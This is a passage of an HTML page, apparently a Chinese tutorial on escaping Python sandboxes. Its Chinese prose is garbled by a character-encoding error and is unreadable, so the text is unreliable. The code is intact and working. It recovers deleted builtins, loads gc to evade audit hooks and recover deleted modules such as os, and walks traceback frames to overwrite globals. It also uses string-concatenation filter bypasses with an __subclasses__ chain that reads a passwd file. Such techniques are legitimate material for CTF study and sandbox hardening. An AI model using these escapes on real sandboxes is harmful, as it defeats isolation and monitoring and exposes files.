blacklist_fun_callback</span><br><span class="line"><span class="built_in">breakpoint</span> = blacklist_fun_callback</span><br></pre></td></tr></table></figure></div>

<p>ä½† builtins æ¨¡å—æ˜¯ä¸€ä¸ªä¸å¯å˜çš„æ¨¡å—å¯¹è±¡ï¼Œè¿™æ ·ä¿®æ”¹ä»…èƒ½å¤Ÿåœ¨å½“å‰çš„ä½œç”¨åŸŸä¸­ç”Ÿæ•ˆï¼Œè€Œ globals() ä¸­å­˜æ”¾äº† builtins æ¨¡å—çš„ç´¢å¼•ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–åˆ°åŸå§‹çš„æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;breakpoint&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>ä½†å¦‚æœé¢˜ç›®ç›´æ¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¥åˆ é™¤ï¼Œé‚£å°±æ²¡æœ‰åŠæ³•äº†ï¼Œå³ä½¿ reload é‡æ–°å¯¼å…¥ builtins æ¨¡å—ï¼Œè¾ƒæ–°ç‰ˆæœ¬çš„ python ä¸­ä¹Ÿæ— æ³•æ¢å¤ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">breakpoint</span></span><br></pre></td></tr></table></figure></div>

<h2 id="åˆ©ç”¨-gc-è·å–å·²åˆ é™¤æ¨¡å—"><a href="#åˆ©ç”¨-gc-è·å–å·²åˆ é™¤æ¨¡å—" class="headerlink" title="åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—"></a>åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—</h2><p><code>del sys.modules[&#39;æ¨¡å—å&#39;]</code> <strong>åªåˆ é™¤å­—å…¸é¡¹ï¼Œä¸ä¼šé”€æ¯æ¨¡å—å¯¹è±¡æœ¬èº«</strong>ï¼Œåªè¦è¿˜æœ‰å…¶ä»–å¼•ç”¨ï¼Œæ¨¡å—ä¾ç„¶å­˜åœ¨äºå†…å­˜ä¸­ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure></div>

<p><code>gc</code> æ˜¯Python çš„å†…ç½®æ¨¡å—ï¼Œå…¨åä¸ºâ€garbage collectorâ€ï¼Œä¸­æ–‡è¯‘ä¸ºâ€åƒåœ¾å›æ”¶â€ã€‚<code>gc</code> æ¨¡å—ä¸»è¦çš„åŠŸèƒ½æ˜¯æä¾›ä¸€ä¸ªæ¥å£ä¾›å¼€å‘è€…ç›´æ¥ä¸ Python çš„åƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡Œäº¤äº’ã€‚</p>
<p>Python ä½¿ç”¨äº†å¼•ç”¨è®¡æ•°ä½œä¸ºå…¶ä¸»è¦çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†å¾ªç¯åƒåœ¾å›æ”¶å™¨æ¥æ£€æµ‹å¹¶æ”¶é›†å¾ªç¯å¼•ç”¨çš„å¯¹è±¡ã€‚<code>gc</code> æ¨¡å—æä¾›äº†ä¸€äº›å‡½æ•°ï¼Œè®©ä½ å¯ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªå¾ªç¯åƒåœ¾å›æ”¶å™¨ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€äº› <code>gc</code> æ¨¡å—ä¸­çš„ä¸»è¦å‡½æ•°ï¼š</p>
<ol>
<li><code>gc.collect(generation=2)</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šç«‹å³è§¦å‘ä¸€æ¬¡åƒåœ¾å›æ”¶ã€‚ä½ å¯ä»¥é€šè¿‡ <code>generation</code> å‚æ•°æŒ‡å®šè¦æ”¶é›†çš„ä»£æ•°ã€‚Python çš„åƒåœ¾å›æ”¶å™¨æ˜¯åˆ†ä»£çš„ï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡åœ¨ç¬¬ä¸€ä»£ï¼Œç»å†è¿‡ä¸€æ¬¡åƒåœ¾å›æ”¶åä»ç„¶å­˜æ´»çš„å¯¹è±¡ä¼šè¢«ç§»åˆ°ä¸‹ä¸€ä»£ã€‚</li>
<li><code>gc.get_objects()</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›å½“å‰è¢«ç®¡ç†çš„æ‰€æœ‰å¯¹è±¡çš„åˆ—è¡¨ã€‚</li>
<li><code>gc.get_referrers(*objs)</code>ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›æŒ‡å‘ <code>objs</code> ä¸­ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„å¯¹è±¡åˆ—è¡¨ã€‚</li>
</ol>
<p>è€Œ <code>gc</code> æ¨¡å—æœ¬èº«å±äº<strong>å†…å»º&#x2F;å†»ç»“æ¨¡å—</strong>ï¼Œèƒ½å¤Ÿé€šè¿‡ <code>__builtins__</code> çš„  <code>__loader__.load_module</code> åŠ è½½ï¼Œä»è€Œç»•è¿‡ä¸€äº›<strong>å®¡è®¡é’©å­ï¼ˆaudit hookï¼‰</strong>å¯¹â€œå¸¸è§„å¯¼å…¥æµç¨‹â€çš„ç›‘æ§ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;gc&#x27;</span> <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).builtin_module_names</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<p>å®Œæ•´æ¼”ç¤ºä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 1) åœ¨ __main__ é‡Œå‡†å¤‡â€œæ¼”ç¤ºè¢«ç¯¡æ”¹â€çš„ç›®æ ‡å¯¹è±¡ =====</span></span><br><span class="line">secret_data = <span class="string">&quot;TOP_SECRET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hidden_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[original] hidden_func called&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ã€åˆå§‹çŠ¶æ€ã€‘secret_data =&quot;</span>, secret_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ã€åˆå§‹çŠ¶æ€ã€‘è°ƒç”¨ hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">hidden_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 2) æ¨¡æ‹Ÿé˜²å¾¡ï¼šä» sys.modules åˆ é™¤æ‰€æœ‰å·²åŠ è½½æ¨¡å—çš„å¼•ç”¨ =====</span></span><br><span class="line"><span class="comment"># è¿™æ ·åšä¼šè®©æ­£å¸¸çš„ import å¤±æ•ˆï¼Œæ— æ³•é€šè¿‡ sys.modules æ‰¾å›æ¨¡å—å¯¹è±¡</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 3) ç»•è¿‡ import é™åˆ¶ï¼šç”¨å†…å»ºå¯¼å…¥å™¨çš„ load_module åŠ è½½ gc æ¨¡å— =====</span></span><br><span class="line"><span class="comment"># __builtins__.__loader__ æ˜¯ BuiltinImporterï¼ˆåªèƒ½åŠ è½½å†…å»º/å†»ç»“æ¨¡å—ï¼Œå¦‚ sysã€gcï¼‰</span></span><br><span class="line"><span class="comment"># è¿™é‡Œç”¨å®ƒç»•è¿‡ importï¼Œç›´æ¥è·å– gc æ¥æšä¸¾å †ä¸Šçš„æ‰€æœ‰å¯¹è±¡</span></span><br><span class="line">gc = __builtins__.__loader__.load_module(<span class="string">&#x27;gc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] é€šè¿‡ gc.get_objects() æ‰«æå †ä¸Šçš„æ‰€æœ‰ Python å¯¹è±¡ï¼Œå¯»æ‰¾ç›®æ ‡æ¨¡å—å¯¹è±¡ ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">mod_main = <span class="literal">None</span></span><br><span class="line">mod_os = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="comment"># ç”¨ &#x27;__name__&#x27; ç­›é€‰å‡ºæ¨¡å—å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> obj.__name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] æ‰¾åˆ°æ¨¡å— __main__&quot;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">elif</span> obj.__name__ == <span class="string">&#x27;os&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] æ‰¾åˆ°æ¨¡å— os&quot;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 4) ç¯¡æ”¹ __main__ æ¨¡å—ä¸­çš„å…¨å±€å˜é‡ä¸å‡½æ•° =====</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] __main__ ä¸­å¯è§çš„ç›®æ ‡å±æ€§:&quot;</span>, [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">dir</span>(mod_main) <span class="keyword">if</span> n <span class="keyword">in</span> &#123;<span class="string">&quot;secret_data&quot;</span>, <span class="string">&quot;hidden_func&quot;</span>&#125;])</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–å˜é‡</span></span><br><span class="line">mod_main.secret_data = <span class="string">&quot;HACKED_SECRET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hacked_hidden_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[hacked] hidden_func called!&quot;</span>)</span><br><span class="line"></span><br><span class="line">mod_main.hidden_func = hacked_hidden_func</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 5) éªŒè¯ç¯¡æ”¹æ•ˆæœï¼ˆæ³¨æ„ï¼šè®¿é—®çš„ä¾ç„¶æ˜¯å½“å‰æ¨¡å—çš„å…¨å±€åï¼‰ =====</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nã€ä¿®æ”¹åã€‘secret_data =&quot;</span>, secret_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ã€ä¿®æ”¹åã€‘è°ƒç”¨ hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">hidden_func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 6) é¢å¤–æ¼”ç¤ºï¼šå¦‚æœæˆåŠŸæ‰¾å›äº† os æ¨¡å—ï¼Œå°±è°ƒç”¨å®ƒçš„åŠŸèƒ½ =====</span></span><br><span class="line"><span class="keyword">if</span> mod_os:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] ä½¿ç”¨æ‰¾å›çš„ os æ¨¡å—åˆ—å½“å‰ç›®å½•:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(mod_os.listdir(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[!] æœªæ‰¾åˆ° os æ¨¡å—å¯¹è±¡ï¼ˆå¯èƒ½æ²¡æœ‰å…¶å®ƒå¼•ç”¨å­˜æ´»ï¼‰&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–åœ¨ 3.11 ç‰ˆæœ¬å’Œ python 3.8.10 ç‰ˆæœ¬ä¸­æµ‹è¯•å‘ç° <code>gc.get_objects</code> ä¼šè¢« audit hook ç›‘æ§ã€‚</p>
<h2 id="åˆ©ç”¨-traceback-è·å–æ¨¡å—"><a href="#åˆ©ç”¨-traceback-è·å–æ¨¡å—" class="headerlink" title="åˆ©ç”¨ traceback è·å–æ¨¡å—"></a>åˆ©ç”¨ traceback è·å–æ¨¡å—</h2><p><code>raise Exception()</code> ä¼šåˆ›å»ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ï¼ŒåŒæ—¶ç”Ÿæˆä¸€æ¡ <strong>traceback é“¾</strong>ï¼ˆ<code>tb</code>ï¼‰ã€‚<br> <code>tb</code> æ˜¯ä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä»£è¡¨ä¸€æ¬¡è°ƒç”¨å¤„çš„<strong>æ‰§è¡Œå¸§</strong>ï¼ˆ<code>frame</code>ï¼‰ã€‚<br> æˆ‘ä»¬å¯ä»¥é€šè¿‡ï¼š</p>
<ul>
<li><code>tb.tb_frame</code> æ‹¿åˆ°<strong>å½“å‰èŠ‚ç‚¹çš„å¸§å¯¹è±¡</strong>ï¼ˆ<code>frame</code>ï¼‰</li>
<li><code>tb.tb_next</code> èµ°åˆ°<strong>ä¸‹ä¸€æ®µè°ƒç”¨</strong>çš„ traceback</li>
<li>åœ¨å¸§å¯¹è±¡ä¸Šç”¨ï¼š<ul>
<li><code>frame.f_globals</code> è®¿é—®<strong>è¯¥å¸§æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</strong></li>
<li><code>frame.f_locals</code> è®¿é—®<strong>è¯¥å¸§çš„å±€éƒ¨å˜é‡</strong></li>
<li><code>frame.f_back</code> ä»<strong>å½“å‰å¸§å›æº¯åˆ°è°ƒç”¨è€…å¸§</strong></li>
</ul>
</li>
</ul>
<p>å½“æˆ‘ä»¬éå†åˆ°<strong>ç›®æ ‡ä½œç”¨åŸŸ</strong>ï¼ˆä¾‹å¦‚ <code>__main__</code> çš„å…¨å±€å­—å…¸ï¼Œæˆ–åŒ…å«ç‰¹å®šæ ‡è¯†ç¬¦çš„å¸§ï¼‰åï¼Œå°±èƒ½<strong>ç›´æ¥ä¿®æ”¹é‚£é‡Œçš„å˜é‡&#x2F;å‡½æ•°</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡ï¼šæ¼”ç¤ºè¦è¢«ä¿®æ”¹çš„å…¨å±€å¯¹è±¡ï¼ˆä½äº __main__ï¼‰</span></span><br><span class="line">secret_data = <span class="string">&quot;TOP_SECRET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hidden_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[original] hidden_func called&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= ä¸šåŠ¡æ ˆ =========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>():</span><br><span class="line">    <span class="comment"># è¿™é‡ŒåªæŠ›ï¼Œä¸è¦æ•ï¼›è®© traceback å¸¦ä¸Šå¤šå±‚è°ƒç”¨ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Demo traceback chain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level2</span>():</span><br><span class="line">    level3()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level1</span>():</span><br><span class="line">    level2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= å·¥å…·ï¼šä» traceback é“¾é‡Œæ‰¾åˆ°ç›®æ ‡ frame =========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_frame_in_tb</span>(<span class="params">tb, want_key=<span class="literal">None</span>, module_name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ä» traceback é“¾é‡Œå®šä½æ»¡è¶³æ¡ä»¶çš„ frameï¼š</span></span><br><span class="line"><span class="string">      - want_key: åœ¨ f_globals é‡Œå¿…é¡»å«æœ‰è¿™ä¸ª keyï¼ˆæ¯”å¦‚ &#x27;hidden_func&#x27;ï¼‰</span></span><br><span class="line"><span class="string">      - module_name: f_globals[&#x27;__name__&#x27;] å¿…é¡»ç­‰äºå®ƒï¼ˆæ¯”å¦‚ &#x27;__main__&#x27;ï¼‰</span></span><br><span class="line"><span class="string">    ä¸¤ä¸ªæ¡ä»¶ä»»ä¸€æ»¡è¶³å³å¯ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cur = tb</span><br><span class="line">    <span class="keyword">while</span> cur:</span><br><span class="line">        f = cur.tb_frame                      <span class="comment"># è¿™é‡Œåœ¨ 3.11 æŸäº›å®¡è®¡ç¯å¢ƒä¸­å¯èƒ½è§¦å‘ object.__getattr__ äº‹ä»¶</span></span><br><span class="line">        g = f.f_globals</span><br><span class="line">        <span class="keyword">if</span> ((want_key <span class="keyword">and</span> want_key <span class="keyword">in</span> g) <span class="keyword">or</span></span><br><span class="line">            (module_name <span class="keyword">and</span> g.get(<span class="string">&quot;__name__&quot;</span>) == module_name)):</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line">        cur = cur.tb_next</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= ä¸»æµç¨‹ =========</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ã€åˆå§‹ã€‘secret_data =&quot;</span>, secret_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ã€åˆå§‹ã€‘è°ƒç”¨ hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>); hidden_func()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        level1()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 1) å–åˆ° traceback é“¾</span></span><br><span class="line">        tb = e.__traceback__  <span class="comment"># ç­‰ä»·äº sys.exc_info()[2]ï¼›ä¿ç•™åŸå§‹é“¾è·¯</span></span><br><span class="line">        <span class="comment"># 2) åœ¨ traceback é“¾é‡Œæ‰¾ __main__ å¯¹åº”çš„ frameï¼ˆæˆ–å«æœ‰ç›®æ ‡åçš„ frameï¼‰</span></span><br><span class="line">        frame = find_frame_in_tb(tb, want_key=<span class="string">&quot;hidden_func&quot;</span>, module_name=<span class="string">&quot;__main__&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> frame:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] æ²¡åœ¨ traceback é“¾é‡Œæ‰¾åˆ°ç›®æ ‡ä½œç”¨åŸŸ&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        g = frame.f_globals</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] å‘½ä¸­ä½œç”¨åŸŸï¼š&quot;</span>, g.get(<span class="string">&quot;__name__&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3) ä¿®æ”¹å…¨å±€å˜é‡ä¸å‡½æ•°</span></span><br><span class="line">        g[<span class="string">&quot;secret_data&quot;</span>] = <span class="string">&quot;HACKED_SECRET&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">hacked_hidden_func</span>():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[hacked] hidden_func called!&quot;</span>)</span><br><span class="line">        g[<span class="string">&quot;hidden_func&quot;</span>] = hacked_hidden_func</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4) éªŒè¯ç»“æœï¼ˆæ³¨æ„ï¼šä¾ç„¶é€šè¿‡å½“å‰æ¨¡å—çš„å…¨å±€åè®¿é—®ï¼‰</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nã€ä¿®æ”¹åã€‘secret_data =&quot;</span>, secret_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ã€ä¿®æ”¹åã€‘è°ƒç”¨ hidden_func(): &quot;</span>, end=<span class="string">&quot;&quot;</span>); hidden_func()</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œç»“æœï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ã€åˆå§‹ã€‘secret_data = TOP_SECRET</span><br><span class="line">ã€åˆå§‹ã€‘è°ƒç”¨ hidden_func(): [original] hidden_func called</span><br><span class="line">[*] å‘½ä¸­ä½œç”¨åŸŸï¼š __main__</span><br><span class="line"></span><br><span class="line">ã€ä¿®æ”¹åã€‘secret_data = HACKED_SECRET</span><br><span class="line">ã€ä¿®æ”¹åã€‘è°ƒç”¨ hidden_func(): [hacked] hidden_func called!</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>Python 3.9 åŠå¸¸è§â€œæ— å®¡è®¡â€ç¯å¢ƒ</strong> ï¼šè®¿é—® <code>tb.tb_frame</code> é€šå¸¸ä¸ä¼šè§¦å‘å®¡è®¡äº‹ä»¶ï¼Œåˆ©ç”¨é“¾å¯ç›´æ¥æˆç«‹ã€‚</p>
</li>
<li><p><strong>Python 3.11 + å®¡è®¡ç­–ç•¥ä¸¥æ ¼çš„ç¯å¢ƒ</strong> ï¼šè®¿é—® <code>tb.tb_frame</code> å¯èƒ½è§¦å‘ <strong><code>object.__getattr__</code></strong> æˆ–ç›¸å…³å®¡è®¡äº‹ä»¶ï¼Œä¼šè¢«å®¡è®¡é’©å­ç›‘æ§ã€‚</p>
</li>
</ul>
<p>è¿™ä¸æ˜¯ç‰ˆæœ¬å¿…ç„¶æ‹¦æˆªï¼Œè€Œæ˜¯<strong>å…·ä½“ç¯å¢ƒæœ‰æ— å®‰è£…å®¡è®¡é’©å­</strong>&amp;<strong>æ‹¦æˆªç‚¹è¦†ç›–åˆ°å“ªé‡Œ</strong>çš„é—®é¢˜ã€‚</p>

    </div>
  </div>

<h1 id="ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤"><a href="#ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤" class="headerlink" title="ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤"></a>ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤</h1><h2 id="å­—ç¬¦ä¸²å˜æ¢"><a href="#å­—ç¬¦ä¸²å˜æ¢" class="headerlink" title="å­—ç¬¦ä¸²å˜æ¢"></a>å­—ç¬¦ä¸²å˜æ¢</h2><h3 id="å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥"></a>å­—ç¬¦ä¸²æ‹¼æ¥</h3><p>åœ¨æˆ‘ä»¬çš„ payload ä¸­ï¼Œä¾‹å¦‚å¦‚ä¸‹çš„ payloadï¼Œ<code>__builtins__</code> <code>file</code> è¿™äº›å­—ç¬¦ä¸²å¦‚æœè¢«è¿‡æ»¤äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å˜æ¢çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>

